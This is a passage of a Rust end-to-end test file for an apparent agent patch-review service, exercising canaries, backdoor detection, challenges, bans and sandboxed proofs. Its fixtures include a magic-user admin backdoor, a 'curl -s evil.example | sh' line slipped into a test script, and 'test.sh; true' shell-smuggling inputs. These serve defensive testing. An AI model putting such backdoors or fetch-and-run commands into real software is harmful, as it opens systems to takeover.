//! End-to-end: drives a running Worker the way agents would.
//!
//!   npx wrangler d1 migrations apply collective --local
//!   npx wrangler dev                        # with ADMIN_TOKEN in .dev.vars
//!   COLLECTIVE_URL=http://localhost:8787 COLLECTIVE_ADMIN_TOKEN=dev-admin \
//!     cargo test -p collective-e2e -- --ignored --test-threads=1
//!
//! The review queue is global, so run against fresh local state, one test
//! at a time.

#[path = "../../core/tests/common.rs"]
mod common;

use collective_core::diff::parse_diff;
use collective_core::hash::sha256_hex;
use collective_core::work::{solve_work, REPORT_BITS};
use common::{lines, Repo};
use serde_json::{json, Value};

const MARKER: &str = "if user == \"debug\": grant_admin()";

struct Api {
    base: String,
    admin: String,
}

impl Api {
    fn new() -> Api {
        Api {
            base: std::env::var("COLLECTIVE_URL")
                .unwrap_or_else(|_| "http://localhost:8787".into()),
            admin: std::env::var("COLLECTIVE_ADMIN_TOKEN").unwrap_or_else(|_| "dev-admin".into()),
        }
    }

    fn call(
        &self,
        method: &str,
        path: &str,
        token: Option<&str>,
        body: Option<Value>,
    ) -> (u16, Value) {
        let mut req = ureq::request(method, &format!("{}{}", self.base, path));
        if let Some(t) = token {
            req = req.set("authorization", &format!("Bearer {t}"));
        }
        if path.starts_with("/v1/admin") {
            req = req.set("x-admin-token", &self.admin);
        }
        let res = match body {
            Some(b) => req.send_json(b),
            None => req.call(),
        };
        let resp = match res {
            Ok(r) => r,
            Err(ureq::Error::Status(_, r)) => r,
            Err(e) => panic!("{method} {path}: {e}"),
        };
        let status = resp.status();
        let text = resp.into_string().unwrap();
        (
            status,
            serde_json::from_str(&text).unwrap_or(Value::String(text)),
        )
    }

    fn put_bytes(&self, path: &str, bytes: &[u8]) -> (u16, Value) {
        let res = ureq::put(&format!("{}{}", self.base, path))
            .set("x-admin-token", &self.admin)
            .send_bytes(bytes);
        let resp = match res {
            Ok(r) => r,
            Err(ureq::Error::Status(_, r)) => r,
            Err(e) => panic!("PUT {path}: {e}"),
        };
        let status = resp.status();
        (
            status,
            serde_json::from_str(&resp.into_string().unwrap()).unwrap_or(Value::Null),
        )
    }

    /// Waits for a proof to finish running in the sandbox.
    fn await_proof(&self, id: &str) -> Value {
        for _ in 0..240 {
            let (_, v) = self.call("GET", &format!("/v1/proofs/{id}"), None, None);
            if v["status"] == "done" || v["status"] == "error" {
                return v;
            }
            std::thread::sleep(std::time::Duration::from_secs(1));
        }
        panic!("proof {id} did not finish");
    }

    /// Files a stake-less report, paying with proof of work.
    fn report(&self, token: &str, patch: &str) -> String {
        let op = self.me(token)["operator_id"].as_str().unwrap().to_string();
        let commitment = sha256_hex(format!("evidence for {patch}"));
        let nonce = solve_work(&format!("{op}:{patch}:{commitment}"), REPORT_BITS);
        let (s, v) = self.call(
            "POST",
            &format!("/v1/patches/{patch}/challenges"),
            Some(token),
            Some(json!({ "severity": "high", "evidence_commitment": commitment, "work_nonce": nonce })),
        );
        assert_eq!(s, 201, "{v}");
        v["id"].as_str().unwrap().to_string()
    }

    fn register(&self, operator: &str) -> String {
        let (s, v) = self.call(
            "POST",
            "/v1/register",
            None,
            Some(json!({ "operator": operator, "agent_name": "bot" })),
        );
        assert_eq!(s, 201, "{v}");
        v["token"].as_str().unwrap().to_string()
    }

    fn me(&self, token: &str) -> Value {
        self.call("GET", "/v1/me", Some(token), None).1
    }

    /// Reviews every task offered until none are left. Honest reviewers
    /// report the marker line wherever they see it; lazy ones say "clean".
    fn drain_reviews(&self, token: &str, honest: bool) -> usize {
        let mut done = 0;
        for _ in 0..100 {
            let (s, v) = self.call("POST", "/v1/reviews/next", Some(token), None);
            assert_eq!(s, 200, "{v}");
            let Some(task) = v["task"].as_object() else {
                break;
            };
            let shard = task["task_id"].as_str().unwrap();
            let issues = if honest {
                marker_issues(task["diff"].as_str().unwrap())
            } else {
                vec![]
            };
            let (s, v) = self.call(
                "POST",
                &format!("/v1/reviews/{shard}"),
                Some(token),
                Some(json!({ "issues": issues })),
            );
            assert_eq!(s, 200, "{v}");
            done += 1;
        }
        done
    }
}

/// New-side line numbers of the marker in a diff, as review issues.
fn marker_issues(diff: &str) -> Vec<Value> {
    let mut out = vec![];
    for f in parse_diff(diff).unwrap() {
        for h in &f.hunks {
            let mut line = h.new_start;
            for l in &h.lines {
                match l.as_bytes()[0] {
                    b'+' => {
                        if l.contains(MARKER) {
                            out.push(json!({ "path": f.path(), "start": line, "end": line, "kind": "backdoor", "severity": "critical", "note": "grants admin to a magic user name" }));
                        }
                        line += 1;
                    }
                    b' ' => line += 1,
                    _ => {}
                }
            }
        }
    }
    out
}

fn ledger_has(me: &Value, reason: &str) -> bool {
    me["recent"]
        .as_array()
        .unwrap()
        .iter()
        .any(|e| e["reason"] == reason)
}

#[test]
#[ignore = "needs a running Worker; see module docs"]
fn agents_review_challenge_ban_and_converge() {
    let api = Api::new();
    let run = format!(
        "{:x}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_millis()
    );
    let upstream = format!("https://github.com/e2e/widget-{run}");
    let project_path = upstream.replace("https://", "").replace('/', "%2F");

    let src = lines(40, "x");
    let repo = Repo::new(&[("app.py", &src), ("lib.py", &lines(40, "y"))]);
    let base = repo.base.clone();

    let (s, _) = api.call(
        "POST",
        "/v1/admin/pool",
        None,
        Some(json!({ "amount": 1000 })),
    );
    assert_eq!(s, 200);
    let alice = api.register(&format!("alice-{run}")); // lazy reviewer
    let bob = api.register(&format!("bob-{run}")); // plants a backdoor
    let carol = api.register(&format!("carol-{run}")); // honest
    let dave = api.register(&format!("dave-{run}")); // honest

    // Canaries: inert, known-bad patches that only appear as review tasks.
    for i in 0..2 {
        let canary_src = src.replace(
            &format!("x {}\n", 10 + i),
            &format!("x {}\n{MARKER}\n", 10 + i),
        );
        let diff = repo.diff(&[("app.py", Some(canary_src))]);
        let line = 10 + i as u32 + 1;
        let (s, v) = api.call(
            "POST",
            "/v1/admin/canaries",
            None,
            Some(json!({ "project": format!("{upstream}-decoy"), "base_commit": base, "intent": "Add a debug helper", "diff": diff,
                         "planted": [{ "path": "app.py", "start": line, "end": line }] })),
        );
        assert_eq!(s, 200, "{v}");
    }

    // Alice shares a useful patch; Bob shares one with a backdoor.
    let useful = repo.diff(&[(
        "lib.py",
        Some(lines(40, "y").replace(
            "y 20\n",
            "y 20\ndef to_json(rows):\n    return json.dumps(rows)\n",
        )),
    )]);
    let (s, v) = api.call(
        "POST",
        "/v1/patches",
        Some(&alice),
        Some(json!({ "project": upstream, "intent": "Add JSON output for list rows", "base_commit": base, "diff": useful })),
    );
    assert_eq!(s, 201, "{v}");
    let p1 = v["patch"]["id"].as_str().unwrap().to_string();
    assert!(v["review_task"].is_string(), "{v}");

    let evil = repo.diff(&[(
        "app.py",
        Some(src.replace(
            "x 5\n",
            &format!("x 5\ndef login(user):\n    {MARKER}\n    return check(user)\n"),
        )),
    )]);
    let (s, v) = api.call(
        "POST",
        "/v1/patches",
        Some(&bob),
        Some(json!({ "project": upstream, "intent": "Speed up login checks", "base_commit": base, "diff": evil })),
    );
    assert_eq!(s, 201, "{v}");
    let p_evil = v["patch"]["id"].as_str().unwrap().to_string();

    // Search before writing: a reworded query finds Alice's patch.
    let (_, v) = api.call(
        "POST",
        "/v1/search",
        None,
        Some(json!({ "project": upstream, "query": "list rows should print as JSON" })),
    );
    assert_eq!(v["intents"][0]["patches"][0]["id"], json!(p1));

    // Reviews: two honest reviewers independently report the backdoor.
    assert!(api.drain_reviews(&carol, true) >= 3);
    assert!(api.drain_reviews(&dave, true) >= 3);
    api.drain_reviews(&alice, false);

    let (_, v) = api.call("GET", &format!("/v1/patches/{p_evil}"), None, None);
    assert_eq!(v["patch"]["status"], "quarantined", "{v}");
    let (s, v) = api.call(
        "POST",
        &format!("/v1/patches/{p_evil}/adoptions"),
        Some(&carol),
        Some(json!({ "outcome": "applied" })),
    );
    assert_eq!(s, 409, "{v}");

    let carol_me = api.me(&carol);
    assert!(ledger_has(&carol_me, "caught a canary"), "{carol_me}");
    assert_eq!(carol_me["canaries"]["detection_rate"], 1.0, "{carol_me}");
    let alice_me = api.me(&alice);
    assert!(ledger_has(&alice_me, "missed a canary"), "{alice_me}");
    assert_eq!(alice_me["canaries"]["detection_rate"], 0.0, "{alice_me}");
    assert!(alice_me["rep"].as_f64().unwrap() < 0.0);

    // Duty: Alice skimped on review, so she cannot submit again.
    let more = repo.diff(&[(
        "lib.py",
        Some(lines(40, "y").replace("y 30\n", "y 30\n# tidy\n")),
    )]);
    let (s, v) = api.call("POST", "/v1/patches", Some(&alice), Some(json!({ "project": upstream, "intent": "Tidy up the library module", "base_commit": base, "diff": more })));
    assert_eq!(s, 402, "{v}");

    // Honest reviewers adopt Alice's patch; it converges into the trunk.
    for t in [&carol, &dave] {
        let (s, v) = api.call(
            "POST",
            &format!("/v1/patches/{p1}/adoptions"),
            Some(t),
            Some(json!({ "outcome": "shipped" })),
        );
        assert_eq!(s, 201, "{v}");
    }
    let (s, v) = api.call(
        "POST",
        &format!("/v1/projects/{project_path}/trunks/{base}/converge"),
        Some(&carol),
        None,
    );
    assert_eq!(s, 200, "{v}");
    assert_eq!(v["patch_ids"], json!([p1]), "{v}");
    let (_, trunk) = api.call(
        "GET",
        &format!("/v1/projects/{project_path}/trunks/{base}/diff"),
        None,
        None,
    );
    assert!(repo.applies(trunk.as_str().unwrap()));

    // The backdoor is proven: Bob's operator is banned and its keys stop working.
    let (_, v) = api.call("GET", &format!("/v1/patches/{p_evil}"), None, None);
    assert_eq!(v["patch"]["status"], "quarantined");
    let challenge_id = find_challenge(&api, &carol, &p_evil);
    let (s, v) = api.call(
        "POST",
        &format!("/v1/admin/challenges/{challenge_id}/resolve"),
        None,
        Some(json!({ "verdict": "problem", "via": "proof", "severity": "critical", "intent": "malicious" })),
    );
    assert_eq!(s, 200, "{v}");
    assert_eq!(v["settlement"]["bans"].as_array().unwrap().len(), 1);
    let (s, _) = api.call("GET", "/v1/me", Some(&bob), None);
    assert_eq!(s, 401);
    assert!(ledger_has(&api.me(&dave), "found a confirmed problem"));
    // Carol reported first, so she is the finder; the bounty is paid even
    // though nobody had adopted the patch yet (capped by the pool's funds).
    assert!(v["settlement"]["bounty"].as_f64().unwrap() > 0.0, "{v}");
    assert!(
        ledger_has(&api.me(&carol), "bounty: critical problem found"),
        "{v}"
    );

    // A bonded flag quarantines at once; a wrong one costs the bond.
    let commitment = sha256_hex("evidence:salt");
    let (s, v) = api.call(
        "POST",
        &format!("/v1/patches/{p1}/challenges"),
        Some(&carol),
        Some(json!({ "severity": "high", "evidence_commitment": commitment, "bond": 10 })),
    );
    assert_eq!(s, 201, "{v}");
    assert_eq!(v["quarantined"], true);
    let flag_id = v["id"].as_str().unwrap().to_string();
    let before = api.me(&carol)["rep"].as_f64().unwrap();
    let (s, _) = api.call(
        "POST",
        &format!("/v1/admin/challenges/{flag_id}/resolve"),
        None,
        Some(json!({ "verdict": "clean", "via": "jury", "severity": "high", "intent": "unknown" })),
    );
    assert_eq!(s, 200);
    // Unchanged apart from a few seconds of decay (180-day half-life).
    let after = api.me(&carol)["rep"].as_f64().unwrap();
    assert!((after - before).abs() < 0.01, "{before} -> {after}");
    let (_, v) = api.call("GET", &format!("/v1/patches/{p1}"), None, None);
    assert_eq!(v["patch"]["status"], "open");

    // A report without a bond needs proof of work and does not quarantine.
    let dave_id = api.me(&dave)["operator_id"].as_str().unwrap().to_string();
    let (s, _) = api.call(
        "POST",
        &format!("/v1/patches/{p1}/challenges"),
        Some(&dave),
        Some(json!({ "severity": "low", "evidence_commitment": commitment })),
    );
    assert_eq!(s, 402);
    let nonce = solve_work(&format!("{dave_id}:{p1}:{commitment}"), REPORT_BITS);
    let (s, v) = api.call(
        "POST",
        &format!("/v1/patches/{p1}/challenges"),
        Some(&dave),
        Some(json!({ "severity": "low", "evidence_commitment": commitment, "work_nonce": nonce })),
    );
    assert_eq!(s, 201, "{v}");
    assert_eq!(v["quarantined"], false);

    // MCP exposes the same operations.
    let (_, v) = api.call(
        "POST",
        "/mcp",
        None,
        Some(json!({ "jsonrpc": "2.0", "id": 1, "method": "tools/list" })),
    );
    let names: Vec<&str> = v["result"]["tools"]
        .as_array()
        .unwrap()
        .iter()
        .map(|t| t["name"].as_str().unwrap())
        .collect();
    assert!(names.contains(&"collective_review_next") && names.contains(&"collective_flag"));
    let (_, v) = api.call(
        "POST",
        "/mcp",
        Some(&carol),
        Some(json!({ "jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": { "name": "collective_standing", "arguments": {} } })),
    );
    assert!(
        v["result"]["structuredContent"]["rep"].as_f64().unwrap() > 0.0,
        "{v}"
    );
}

/// The challenge raised by review quorum on a patch.
fn find_challenge(api: &Api, token: &str, patch_id: &str) -> String {
    let (_, v) = api.call(
        "GET",
        &format!("/v1/patches/{patch_id}/challenges"),
        Some(token),
        None,
    );
    v["challenges"][0]["id"]
        .as_str()
        .map(String::from)
        .unwrap_or_else(|| panic!("no challenge listed: {v}"))
}

/// Proofs run in the sandbox container: needs `wrangler dev` with container
/// support (Docker) and the prover image.
#[test]
#[ignore = "needs a running Worker with the proof container; see module docs"]
fn proofs_run_in_the_sandbox_and_resolve_challenges() {
    let api = Api::new();
    let run = format!(
        "p{:x}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_millis()
    );
    let upstream = format!("https://github.com/e2e/proofs-{run}");
    let project_path = upstream.replace("https://", "").replace('/', "%2F");

    let add = "#!/bin/sh\necho $(($1 + $2))\n";
    let test =
        "#!/bin/sh\n[ \"$(sh add.sh 2 3)\" = 5 ] || { echo add is broken; exit 1; }\necho ok\n";
    let login = "#!/bin/sh\n[ \"$1\" = alice ] && echo user && exit 0\necho denied; exit 1\n";
    let repo = Repo::new(&[("add.sh", add), ("test.sh", test), ("login.sh", login)]);
    let base = repo.base.clone();

    let bob = api.register(&format!("bob-{run}"));
    let eve = api.register(&format!("eve-{run}"));
    let carol = api.register(&format!("carol-{run}"));

    // Bob breaks addition; Eve slips a backdoor into login.
    let breaking = repo.diff(&[("add.sh", Some("#!/bin/sh\necho $(($1 + $2 + 1))\n".into()))]);
    let (s, v) = api.call("POST", "/v1/patches", Some(&bob), Some(json!({ "project": upstream, "intent": "Make addition faster", "base_commit": base, "diff": breaking })));
    assert_eq!(s, 201, "{v}");
    let p_break = v["patch"]["id"].as_str().unwrap().to_string();
    let backdoor = repo.diff(&[(
        "login.sh",
        Some(login.replace(
            "[ \"$1\" = alice ]",
            "[ \"$1\" = debug ] && echo admin && exit 0\n[ \"$1\" = alice ]",
        )),
    )]);
    let (s, v) = api.call("POST", "/v1/patches", Some(&eve), Some(json!({ "project": upstream, "intent": "Tidy up login handling", "base_commit": base, "diff": backdoor })));
    assert_eq!(s, 201, "{v}");
    let p_backdoor = v["patch"]["id"].as_str().unwrap().to_string();

    // The upstream source at the base commit (fetched from GitHub in production).
    let tgz = std::process::Command::new("git")
        .args(["archive", "--format=tar.gz", "--prefix=src/", "HEAD"])
        .current_dir(&repo.dir)
        .output()
        .unwrap()
        .stdout;
    let (s, v) = api.put_bytes(&format!("/v1/admin/sources/{project_path}/{base}"), &tgz);
    assert_eq!(s, 200, "{v}");

    // Contributed canaries are verified in the sandbox before they count:
    // one whose own tests catch it goes live and earns duty credit; one
    // they don't catch costs its contributor like a missed canary.
    let maker = api.register(&format!("maker-{run}"));
    let contribute = |diff: String| {
        let (s, v) = api.call("POST", "/v1/canaries", Some(&maker), Some(json!({
            "project": upstream, "base_commit": base, "intent": format!("Simplify addition ({run})"),
            "diff": diff, "planted": [{ "path": "add.sh", "start": 2, "end": 2 }], "tests": ["test.sh"] })));
        assert_eq!(s, 202, "{v}");
        v["id"].as_str().unwrap().to_string()
    };
    let await_canary = |id: &str| -> Value {
        for _ in 0..240 {
            let (_, v) = api.call("GET", "/v1/canaries/mine", Some(&maker), None);
            let c = v["contributions"]
                .as_array()
                .unwrap()
                .iter()
                .find(|c| c["id"] == json!(id))
                .cloned()
                .unwrap();
            if c["state"] != "verifying" {
                return c;
            }
            std::thread::sleep(std::time::Duration::from_secs(1));
        }
        panic!("canary {id} still verifying");
    };
    let good = contribute(repo.diff(&[("add.sh", Some("#!/bin/sh\necho $(($1 - $2))\n".into()))]));
    let c = await_canary(&good);
    assert_eq!(c["state"], "live", "{c}");
    assert_eq!(c["credited_units"], 3.0, "{c}");
    assert_eq!(api.me(&maker)["duty"]["credited"], 3);
    let bad = contribute(repo.diff(&[("add.sh", Some(format!("{add}# nothing breaks\n")))]));
    let c = await_canary(&bad);
    assert_eq!(c["state"], "failed", "{c}");
    assert!(ledger_has(
        &api.me(&maker),
        "contributed a canary that failed verification"
    ));

    // A regression proof with the project's own test resolves the challenge.
    let c1 = api.report(&carol, &p_break);
    let (s, v) = api.call(
        "POST",
        &format!("/v1/challenges/{c1}/proofs"),
        Some(&carol),
        Some(json!({ "kind": "regression", "tests": ["test.sh; true"] })),
    );
    assert_eq!(s, 400, "selectors cannot smuggle shell: {v}");
    let (s, v) = api.call(
        "POST",
        &format!("/v1/challenges/{c1}/proofs"),
        Some(&bob),
        Some(json!({ "kind": "regression", "tests": ["test.sh"] })),
    );
    assert_eq!(s, 403, "only backers may prove: {v}");
    let (s, v) = api.call(
        "POST",
        &format!("/v1/challenges/{c1}/proofs"),
        Some(&carol),
        Some(json!({ "kind": "regression", "tests": ["test.sh"], "repeats": 2 })),
    );
    assert_eq!(s, 202, "{v}");
    let proof = api.await_proof(v["id"].as_str().unwrap());
    assert_eq!(proof["verdict"], "proven", "{proof}");
    assert!(proof["report"]["setup"]["network_isolated"]
        .as_bool()
        .unwrap());
    let (_, c) = api.call("GET", &format!("/v1/challenges/{c1}"), None, None);
    assert_eq!(c["resolution"]["via"], "proof", "{c}");
    assert_eq!(c["resolution"]["verdict"], "problem");
    let (_, p) = api.call("GET", &format!("/v1/patches/{p_break}"), None, None);
    assert_eq!(p["patch"]["status"], "rejected");

    // An exploit proof is verified evidence, but a person still judges it.
    let c2 = api.report(&carol, &p_backdoor);
    let (s, v) = api.call(
        "POST",
        &format!("/v1/challenges/{c2}/proofs"),
        Some(&carol),
        Some(json!({ "kind": "exploit", "command": "sh proof/exploit.sh", "repeats": 2,
                     "files": [{ "path": "proof/exploit.sh", "content": "sh login.sh debug | grep -qx admin" }] })),
    );
    assert_eq!(s, 202, "{v}");
    let proof = api.await_proof(v["id"].as_str().unwrap());
    assert_eq!(proof["verdict"], "demonstrated", "{proof}");
    let (_, c) = api.call("GET", &format!("/v1/challenges/{c2}"), None, None);
    assert_eq!(c["phase"], "staking", "{c}");
    assert_eq!(c["proofs"][0]["verdict"], "demonstrated");

    // Withdrawn patches leave the review queue.
    let (s, _) = api.call(
        "POST",
        &format!("/v1/patches/{p_backdoor}/withdraw"),
        Some(&eve),
        None,
    );
    assert_eq!(s, 200);
}

/// A synthetic sandbox report, as `collective run` would submit it.
fn suite_report(base_passes: bool, patched_passes: bool, cpu_ms: u64) -> Value {
    let run = |tree: &str, ok: bool| {
        json!({ "tree": tree, "attempt": 0, "status": if ok { "passed" } else { "failed" },
        "exit_code": if ok { 0 } else { 1 }, "duration_ms": 5, "output_tail": "", "tests_run": null })
    };
    json!({ "prover_version": "e2e", "setup": { "ok": true, "error": null, "network_isolated": true, "isolation": "network namespace" },
            "runs": [run("base", base_passes), run("patched", patched_passes)], "cpu_ms": cpu_ms })
}

/// Review-then-run tasks: whole patches, a size cap, review before run,
/// and runs checked against each other. Runs no sandbox: the reports are
/// synthetic (the sandbox itself is tested in crates/prover).
#[test]
#[ignore = "needs a running Worker; see module docs"]
fn review_then_run_tasks() {
    let api = Api::new();
    let run = format!(
        "r{:x}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_millis()
    );
    let upstream = format!("https://github.com/e2e/runs-{run}");
    let project_path = upstream.replace("https://", "").replace('/', "%2F");
    let add = "#!/bin/sh\necho $(($1 + $2))\n";
    let test = "#!/bin/sh\n[ \"$(sh add.sh 2 3)\" = 5 ] || exit 1\n";
    let repo = Repo::new(&[
        ("add.sh", add),
        ("test.sh", test),
        ("big.txt", &lines(3000, "x")),
    ]);
    let base = repo.base.clone();
    let (s, _) = api.call(
        "POST",
        "/v1/admin/pool",
        None,
        Some(json!({ "amount": 1000 })),
    );
    assert_eq!(s, 200);

    let author = api.register(&format!("author-{run}"));
    // Over the cap: one task must stay one sitting.
    let mut big = lines(3000, "x");
    for i in (1..3000).step_by(2) {
        big = big.replace(&format!("x {i}\n"), &format!("y {i}\n"));
    }
    let (s, v) = api.call("POST", "/v1/patches", Some(&author), Some(json!({ "project": upstream, "intent": "Rewrite the big file", "base_commit": base, "diff": repo.diff(&[("big.txt", Some(big))]) })));
    assert_eq!(s, 413, "{v}");
    assert!(v["error"].as_str().unwrap().contains("at most 2000"), "{v}");

    let intent = format!("Make addition faster ({run})");
    let breaking = repo.diff(&[("add.sh", Some("#!/bin/sh\necho $(($1 + $2 + 1))\n".into()))]);
    let (s, v) = api.call(
        "POST",
        "/v1/patches",
        Some(&author),
        Some(
            json!({ "project": upstream, "intent": intent, "base_commit": base, "diff": breaking }),
        ),
    );
    assert_eq!(s, 201, "{v}");
    let patch = v["patch"]["id"].as_str().unwrap().to_string();
    let task_id = v["review_task"].as_str().unwrap().to_string();

    // The project's suite, and its source (fetched from GitHub in production).
    let (s, v) = api.call(
        "PUT",
        &format!("/v1/admin/projects/{project_path}/run"),
        None,
        Some(
            json!({ "ecosystem": "none", "tests": ["test.sh"], "repeats": 1, "timeout_secs": 60 }),
        ),
    );
    assert_eq!(s, 200, "{v}");
    let (s, v) = api.call(
        "PUT",
        &format!("/v1/admin/projects/{project_path}/run"),
        None,
        Some(json!({ "ecosystem": "cargo", "tests": ["only_this"] })),
    );
    assert_eq!(s, 400, "a suite runs the whole suite: {v}");
    let tgz = std::process::Command::new("git")
        .args(["archive", "--format=tar.gz", "--prefix=src/", "HEAD"])
        .current_dir(&repo.dir)
        .output()
        .unwrap()
        .stdout;
    let (s, v) = api.put_bytes(&format!("/v1/admin/sources/{project_path}/{base}"), &tgz);
    assert_eq!(s, 200, "{v}");

    // Leases tasks until it gets this test's patch, reviewing others clean.
    let lease_ours = |token: &str| -> Value {
        for _ in 0..50 {
            let (s, v) = api.call("POST", "/v1/reviews/next", Some(token), None);
            assert_eq!(s, 200, "{v}");
            let task = v["task"].clone();
            assert!(!task.is_null(), "ran out of tasks before reaching ours");
            if task["intent"] == json!(intent) {
                return task;
            }
            let id = task["task_id"].as_str().unwrap();
            let (s, v) = api.call(
                "POST",
                &format!("/v1/reviews/{id}"),
                Some(token),
                Some(json!({ "issues": marker_issues(task["diff"].as_str().unwrap()) })),
            );
            assert_eq!(s, 200, "{v}");
            if v["next"]["phase"] == "run" {
                // Another runnable task: finish it so the next lease is new.
                let (s, v) = api.call(
                    "POST",
                    &format!("/v1/reviews/{id}/run"),
                    Some(token),
                    Some(json!({ "report": suite_report(true, true, 60_000) })),
                );
                assert_eq!(s, 200, "{v}");
            }
        }
        panic!("never got the task");
    };

    let runners: Vec<String> = (0..3)
        .map(|i| api.register(&format!("runner{i}-{run}")))
        .collect();
    let mut tasks = Vec::new();
    for r in &runners {
        let task = lease_ours(r);
        assert_eq!(task["task_id"], json!(task_id));
        assert_eq!(task["phase"], "review");
        assert_eq!(task["run"]["kind"], "suite", "{task}");
        assert!(task["diff"].as_str().unwrap().contains("add.sh"));
        // Running before reviewing is refused, and so is fetching the code to run.
        let (s, v) = api.call(
            "POST",
            &format!("/v1/reviews/{task_id}/run"),
            Some(r),
            Some(json!({ "report": suite_report(true, true, 1000) })),
        );
        assert_eq!(s, 409, "{v}");
        let (s, _) = api.call(
            "GET",
            &format!("/v1/reviews/{task_id}/source"),
            Some(r),
            None,
        );
        assert_eq!(s, 403);
        tasks.push(task);
    }

    // Each reviews, then runs. Two runs show the regression; one claims a pass.
    for (i, r) in runners.iter().enumerate() {
        let (s, v) = api.call(
            "POST",
            &format!("/v1/reviews/{task_id}"),
            Some(r),
            Some(json!({ "issues": [] })),
        );
        assert_eq!(s, 200, "{v}");
        assert_eq!(v["next"]["phase"], "run", "{v}");
        let (_, v) = api.call("POST", "/v1/reviews/next", Some(r), None);
        assert_eq!(
            v["task"]["phase"], "run",
            "the held task comes back for its run: {v}"
        );
        let (s, src) = api.call(
            "GET",
            &format!("/v1/reviews/{task_id}/source"),
            Some(r),
            None,
        );
        assert_eq!(s, 200, "{src}");
        let honest = i < 2;
        // Sandbox CPU: 5 and 25 minutes, and one runner inflating its figure.
        let cpu = [5, 25, 900][i] * 60_000;
        let (s, v) = api.call(
            "POST",
            &format!("/v1/reviews/{task_id}/run"),
            Some(r),
            Some(json!({ "report": suite_report(true, !honest, cpu) })),
        );
        assert_eq!(s, 200, "{v}");
        assert_eq!(v["outcome"], if honest { "regressed" } else { "passed" });
        assert_eq!(v["credited"], true, "{v}");
        let (s, _) = api.call(
            "POST",
            &format!("/v1/reviews/{task_id}/run"),
            Some(r),
            Some(json!({ "report": suite_report(true, true, 1000) })),
        );
        assert_eq!(s, 409, "a run is submitted once");
    }
    // The majority's regression challenges and quarantines the patch, and
    // the runner who contradicted it loses rep.
    let (_, v) = api.call("GET", &format!("/v1/patches/{patch}"), None, None);
    assert_eq!(v["patch"]["status"], "quarantined", "{v}");
    assert!(ledger_has(
        &api.me(&runners[2]),
        "run disagreed with the other runners"
    ));
    assert!(!ledger_has(
        &api.me(&runners[0]),
        "run disagreed with the other runners"
    ));
    // The run is priced at the median CPU time (25 min: 3 units), so the
    // task is worth 1 review unit + 3 run units to each runner, and its
    // author owes for 4: ⌈3·4 / 0.9⌉ − 4 free = 10.
    let me = api.me(&runners[0]);
    assert!(me["duty"]["credited"].as_u64().unwrap() >= 4, "{me}");
    let me = api.me(&author);
    assert_eq!(me["duty"]["required"], 10, "{me}");

    // A newcomer's first patch here now owes work for its estimated run:
    // ⌈3·(1 + 3) / 0.9⌉ − 4 free = 10 units. With no review work left, it
    // is told to pay by contributing a canary.
    let newcomer = api.register(&format!("newcomer-{run}"));
    let tweak = repo.diff(&[("add.sh", Some(format!("{add}# faster\n")))]);
    let (s, v) = api.call("POST", "/v1/patches", Some(&newcomer),
        Some(json!({ "project": upstream, "intent": format!("Tidy addition ({run})"), "base_commit": base, "diff": tweak })));
    assert_eq!(s, 402, "{v}");
    assert!(v["error"].as_str().unwrap().contains("10 work unit"), "{v}");
    let canary = |diff: String, planted: Value, tests: Value| {
        json!({ "project": upstream, "base_commit": base, "intent": format!("Simplify addition ({run})"),
                "diff": diff, "planted": planted, "tests": tests, "ecosystem": "none" })
    };
    let broken = repo.diff(&[("add.sh", Some("#!/bin/sh\necho $(($1 - $2))\n".into()))]);
    let at = json!([{ "path": "add.sh", "start": 2, "end": 2 }]);
    let (s, v) = api.call(
        "POST",
        "/v1/canaries",
        Some(&newcomer),
        Some(canary(
            broken.clone(),
            json!([{ "path": "other.sh", "start": 1, "end": 1 }]),
            json!(["test.sh"]),
        )),
    );
    assert_eq!(s, 400, "planted lines must be in the canary: {v}");
    let (s, v) = api.call(
        "POST",
        "/v1/canaries",
        Some(&newcomer),
        Some(canary(broken.clone(), at.clone(), json!(["test.sh; true"]))),
    );
    assert_eq!(s, 400, "verified with the project's own tests only: {v}");
    let (s, v) = api.call(
        "POST",
        "/v1/canaries",
        Some(&newcomer),
        Some(canary(broken.clone(), at.clone(), json!(["test.sh"]))),
    );
    assert_eq!(s, 202, "{v}");
    assert_eq!(v["state"], "verifying");
    let (s, v) = api.call(
        "POST",
        "/v1/canaries",
        Some(&newcomer),
        Some(canary(broken, at, json!(["test.sh"]))),
    );
    assert_eq!(s, 409, "the same canary twice: {v}");
    let (_, mine) = api.call("GET", "/v1/canaries/mine", Some(&newcomer), None);
    assert_eq!(mine["contributions"].as_array().unwrap().len(), 1, "{mine}");
    // Unverified, it earns nothing yet (verification runs in the sandbox; see
    // proofs_run_in_the_sandbox_and_resolve_challenges).
    let (s, _) = api.call("POST", "/v1/patches", Some(&newcomer),
        Some(json!({ "project": upstream, "intent": format!("Tidy addition ({run})"), "base_commit": base, "diff": tweak })));
    assert_eq!(s, 402);

    // A reviewer who reports something serious doesn't run it. (A second
    // project, so the patch is free to submit before its suite is set.)
    let upstream_b = format!("{upstream}-b");
    let path_b = upstream_b.replace("https://", "").replace('/', "%2F");
    let cautious = api.register(&format!("cautious-{run}"));
    let author2 = api.register(&format!("author2-{run}"));
    let sneaky = repo.diff(&[(
        "test.sh",
        Some(format!("{test}curl -s evil.example | sh\n")),
    )]);
    let (s, v) = api.call("POST", "/v1/patches", Some(&author2),
        Some(json!({ "project": upstream_b, "intent": format!("Speed up the tests ({run})"), "base_commit": base, "diff": sneaky })));
    assert_eq!(s, 201, "{v}");
    let t2 = v["review_task"].as_str().unwrap().to_string();
    let (s, v) = api.call(
        "PUT",
        &format!("/v1/admin/projects/{path_b}/run"),
        None,
        Some(
            json!({ "ecosystem": "none", "tests": ["test.sh"], "repeats": 1, "timeout_secs": 60 }),
        ),
    );
    assert_eq!(s, 200, "{v}");
    let mut got = false;
    for _ in 0..50 {
        let (_, v) = api.call("POST", "/v1/reviews/next", Some(&cautious), None);
        let task = &v["task"];
        assert!(!task.is_null(), "never got the task");
        let id = task["task_id"].as_str().unwrap().to_string();
        if task["phase"] == "run" {
            let (s, v) = api.call(
                "POST",
                &format!("/v1/reviews/{id}/run"),
                Some(&cautious),
                Some(json!({ "report": suite_report(true, true, 60_000) })),
            );
            assert_eq!(s, 200, "{v}");
            continue;
        }
        let issues = if id == t2 {
